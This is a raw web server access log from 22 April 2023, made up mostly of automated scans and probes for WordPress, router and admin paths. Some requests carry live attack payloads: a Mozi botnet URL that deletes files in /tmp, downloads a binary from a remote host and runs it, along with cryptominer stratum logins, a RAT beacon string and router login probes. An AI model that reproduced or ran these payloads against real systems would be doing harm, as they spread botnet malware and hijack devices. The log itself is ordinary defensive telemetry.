193.32.162.159 - - [22/Apr/2023:06:12:24 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:06:12:34 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.254 - - [22/Apr/2023:06:19:17 +0200] "GET / HTTP/1.0" 200 612 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.233.19.18 - - [22/Apr/2023:06:20:09 +0200] "GET / HTTP/1.1" 200 612 "-" "-"
185.233.19.120 - - [22/Apr/2023:06:21:17 +0200] "GET / HTTP/1.1" 200 612 "-" "-"
205.210.31.180 - - [22/Apr/2023:06:25:09 +0200] "GET / HTTP/1.1" 301 178 "-" "-"
92.118.39.82 - - [22/Apr/2023:06:41:09 +0200] "GET / HTTP/1.1" 200 612 "-" "-"
92.118.39.82 - - [22/Apr/2023:06:41:10 +0200] "GET /cgi-bin/downloadFlile.cgi HTTP/1.1" 404 162 "-" "Hello World"
212.115.49.107 - - [22/Apr/2023:06:43:29 +0200] "GET /archivarix.cms.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36"
184.105.139.68 - - [22/Apr/2023:06:52:36 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56"
184.105.139.68 - - [22/Apr/2023:06:54:28 +0200] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.2.987 Yowser/2.5 Safari/537.36"
184.105.139.68 - - [22/Apr/2023:06:55:02 +0200] "GET /geoserver/web/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56"
54.242.201.126 - - [22/Apr/2023:06:56:00 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.5.715 Yowser/2.5 Safari/537.36"
64.62.197.44 - - [22/Apr/2023:06:56:07 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
64.62.197.38 - - [22/Apr/2023:06:57:30 +0200] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41"
64.62.197.46 - - [22/Apr/2023:06:58:09 +0200] "GET /geoserver/web/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
46.101.95.18 - - [22/Apr/2023:07:11:16 +0200] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03qU|\x99\xB5\xE6\xE2j\x83\xE0<\x96\x0E" 400 166 "-" "-"
46.101.95.18 - - [22/Apr/2023:07:11:16 +0200] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xDAu\xC0\xAE%$\xF5BE`A}K\xD1<\xED_C\xAC\xB4\x1A\xB3\x8A\x1Fc!Z\xFBA\xF9E\xDB\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
46.101.95.18 - - [22/Apr/2023:07:11:16 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.101.95.18 - - [22/Apr/2023:07:11:16 +0200] "GET /client/get_targets HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.101.95.18 - - [22/Apr/2023:07:11:16 +0200] "GET /upl.php HTTP/1.1" 404 134 "-" "Mozilla/5.0"
46.101.95.18 - - [22/Apr/2023:07:11:17 +0200] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x16w\xF1\x7F\xD1\x8ARC\x82\xF8X\x15\xFFf\x8F-\x95y\xC1WJI\xF6\xF4\xE2O-\xFC\xCA\xE4\x93<\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
46.101.95.18 - - [22/Apr/2023:07:11:17 +0200] "GET /geoip/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.101.95.18 - - [22/Apr/2023:07:11:17 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
46.101.95.18 - - [22/Apr/2023:07:11:17 +0200] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
89.189.115.212 - - [22/Apr/2023:07:17:01 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET /xmlrpc.php?rsd HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:24 +0200] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:25 +0200] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:25 +0200] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:25 +0200] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:25 +0200] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:25 +0200] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:25 +0200] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:25 +0200] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
172.69.23.32 - - [22/Apr/2023:07:18:25 +0200] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
198.235.24.169 - - [22/Apr/2023:07:25:55 +0200] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x99\x9Cb\xB8`\x8C\xB8\xDEo~\x9A1\x9D\xCCC\xC0\x9C$\x141}\x8F\xFF\xB9~\x10\x12\xEE/\x85mP\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"
198.235.24.252 - - [22/Apr/2023:07:35:42 +0200] "GET / HTTP/1.1" 301 178 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
27.215.87.217 - - [22/Apr/2023:07:36:12 +0200] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://27.215.87.217:51668/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 162 "-" "Hello, world"
205.210.31.66 - - [22/Apr/2023:07:49:32 +0200] "GET / HTTP/1.1" 200 612 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
2.189.223.101 - - [22/Apr/2023:07:57:13 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
172.71.215.15 - - [22/Apr/2023:07:57:36 +0200] "GET /wp-login.php HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
172.70.85.223 - - [22/Apr/2023:08:05:03 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
35.163.145.148 - - [22/Apr/2023:08:14:32 +0200] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
52.32.9.29 - - [22/Apr/2023:08:15:31 +0200] "GET /favicon.ico HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
52.32.9.29 - - [22/Apr/2023:08:15:35 +0200] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
117.235.10.173 - - [22/Apr/2023:08:24:13 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
117.235.10.173 - - [22/Apr/2023:08:24:13 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.32.162.159 - - [22/Apr/2023:08:48:07 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:08:48:17 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.88.66.237 - - [22/Apr/2023:08:53:13 +0200] "GET / HTTP/1.1" 200 396 "http://166.0.134.19:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
172.71.130.106 - - [22/Apr/2023:08:53:33 +0200] "GET / HTTP/1.1" 200 396 "-" "-"
60.180.237.223 - - [22/Apr/2023:09:00:47 +0200] "POST /HNAP1/ HTTP/1.0" 404 162 "-" "-"
54.164.87.94 - - [22/Apr/2023:09:03:18 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/51.0.3064.92 Safari/537.32"
66.240.205.34 - - [22/Apr/2023:09:14:24 +0200] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 166 "-" "-"
176.97.210.59 - - [22/Apr/2023:09:46:02 +0200] "GET /home.asp HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36"
193.32.162.159 - - [22/Apr/2023:09:55:35 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:09:55:46 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.71.134.230 - - [22/Apr/2023:10:03:21 +0200] "GET / HTTP/1.1" 200 396 "-" "-"
193.32.162.159 - - [22/Apr/2023:10:05:42 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:10:05:52 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.187.98.121 - - [22/Apr/2023:10:21:35 +0200] "GET / HTTP/1.1" 200 396 "-" "python-requests/2.28.2"
192.241.218.17 - - [22/Apr/2023:10:29:47 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 zgrab/0.x"
34.77.127.183 - - [22/Apr/2023:10:35:55 +0200] "GET / HTTP/1.1" 200 396 "-" "python-requests/2.28.2"
45.88.66.237 - - [22/Apr/2023:10:45:28 +0200] "GET / HTTP/1.1" 200 396 "http://166.0.134.88:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
185.213.175.253 - - [22/Apr/2023:11:27:00 +0200] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x890\x82,\xE0\x9D\xD5P\x1Cy\xBA\xB5\x9C\xFB\xCC\x8C\xFF\x90mv\x87\x81\xD3\xC1\x92\x01\xF0S\xB6\xAA\xB8\x05 \xC8\x0B\x1E\xBD$\x8F\xDD\xB2\xDEk\x19j\xBF\xFE\xCC9\xD69\x19\x09\xDEv\xCF\x93\xF5\xF7#\xD2\xBA\xD6:V\x00\x96\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 166 "-" "-"
185.213.175.253 - - [22/Apr/2023:11:27:06 +0200] "{\x22id\x22: 1, \x22method\x22: \x22mining.subscribe\x22, \x22params\x22: [\x22cpuminer/2.5.1\x22]}" 400 166 "-" "-"
185.213.175.253 - - [22/Apr/2023:11:27:14 +0200] "{\x22id\x22: 1, \x22method\x22: \x22mining.subscribe\x22, \x22params\x22: [\x22MinerName/1.0.0\x22, \x22EthereumStratum/1.0.0\x22]}" 400 166 "-" "-"
185.213.175.253 - - [22/Apr/2023:11:27:18 +0200] "{\x22id\x22:1,\x22method\x22:\x22eth_submitLogin\x22,\x22worker\x22:\x22eth1.0\x22,\x22params\x22:[\x220x0a23ae0ac5bc2ec2b78fbcae01c9ead7326a4e5d\x22,\x22x\x22],\x22jsonrpc\x22:\x222.0\x22}" 400 166 "-" "-"
185.213.175.253 - - [22/Apr/2023:11:27:23 +0200] "{\x22id\x22:1,\x22jsonrpc\x22:\x222.0\x22,\x22method\x22:\x22login\x22,\x22params\x22:{\x22login\x22:\x2246uuD6bxwJYC17hQ5sCujsj1GjpmTxaU73Q1AU6MNdwiEp2CNUUB2Mq5Nn4TB87JscGu8WLvenTAfEjF4tGkVvdE7v1u2Rx\x22,\x22pass\x22:\x22x\x22,\x22agent\x22:\x22XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019\x22,\x22algo\x22:[\x22cn/1\x22,\x22cn/2\x22,\x22cn/r\x22,\x22cn/fast\x22,\x22cn/half\x22,\x22cn/xao\x22,\x22cn/rto\x22,\x22cn/rwz\x22,\x22cn/zls\x22,\x22cn/double\x22,\x22cn/ccx\x22,\x22cn-lite/1\x22,\x22cn-heavy/0\x22,\x22cn-heavy/tube\x22,\x22cn-heavy/xhv\x22,\x22cn-pico\x22,\x22cn-pico/tlo\x22,\x22cn/upx2\x22,\x22rx/0\x22,\x22rx/wow\x22,\x22rx/arq\x22,\x22rx/graft\x22,\x22rx/sfx\x22,\x22rx/keva\x22,\x22argon2/chukwa\x22,\x22argon2/chukwav2\x22,\x22argon2/ninja\x22,\x22astrobwt\x22]}}" 400 166 "-" "-"
185.213.175.253 - - [22/Apr/2023:11:27:35 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.213.175.253 - 1JTsMyn4yizbEWCDqeuedShvC9CRjj4ByS [22/Apr/2023:11:28:05 +0200] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.213.175.253 - 0xca690a26b9442a1101fba505387baa8b2d78db5a [22/Apr/2023:11:28:13 +0200] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.213.175.253 - - [22/Apr/2023:11:28:13 +0200] "GET /WuEL HTTP/1.1" 404 564 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; ; NCLIENT50_AAPCDA5841E333)"
185.213.175.253 - - [22/Apr/2023:11:28:14 +0200] "GET stager64 HTTP/1.1" 400 166 "-" "-"
185.213.175.253 - - [22/Apr/2023:11:28:15 +0200] "GET /a HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.213.175.253 - - [22/Apr/2023:11:28:31 +0200] "GET /download/file.ext HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.213.175.253 - - [22/Apr/2023:11:28:34 +0200] "GET /SiteLoader HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
185.213.175.253 - - [22/Apr/2023:11:28:34 +0200] "GET /mPlayer HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
149.129.50.37 - - [22/Apr/2023:11:37:56 +0200] "GET http://www.1ucn.com/proxychecker/index.php HTTP/1.1" 404 162 "-" "Mozilla/4.0 (compatible; RSS Popper)"
149.129.50.37 - - [22/Apr/2023:11:37:56 +0200] "\x05\x02\x00\x01" 400 166 "-" "-"
149.129.50.37 - - [22/Apr/2023:11:37:57 +0200] "\x04\x01\x00P\x95\x812%\x00" 400 166 "-" "-"
45.128.232.144 - - [22/Apr/2023:11:49:56 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://166.0.134.88:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.144 - - [22/Apr/2023:11:49:56 +0200] "" 400 0 "-" "-"
193.32.162.159 - - [22/Apr/2023:11:51:28 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:11:51:38 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.83.146.154 - - [22/Apr/2023:12:08:28 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0"
138.255.12.168 - - [22/Apr/2023:12:10:44 +0200] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
141.101.68.64 - - [22/Apr/2023:12:16:28 +0200] "GET / HTTP/1.1" 200 396 "-" "-"
179.43.177.243 - - [22/Apr/2023:12:19:55 +0200] "GET / HTTP/1.1" 200 612 "-" "Hello World"
179.43.177.243 - - [22/Apr/2023:12:32:28 +0200] "GET / HTTP/1.1" 200 612 "-" "Hello World"
193.32.162.159 - - [22/Apr/2023:12:33:36 +0200] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [22/Apr/2023:12:33:47 +0200] "GET /dispatch.asp HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.177.243 - - [22/Apr/2023:13:06:35 +0200] "GET / HTTP/1.1" 200 612 "-" "Hello World"
170.64.190.191 - - [22/Apr/2023:13:18:44 +0200] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC4\x90\xEDQ\x9F\x18\x03\xAF\xA1R\x83\x98*\xE65%\x9A" 400 166 "-" "-"
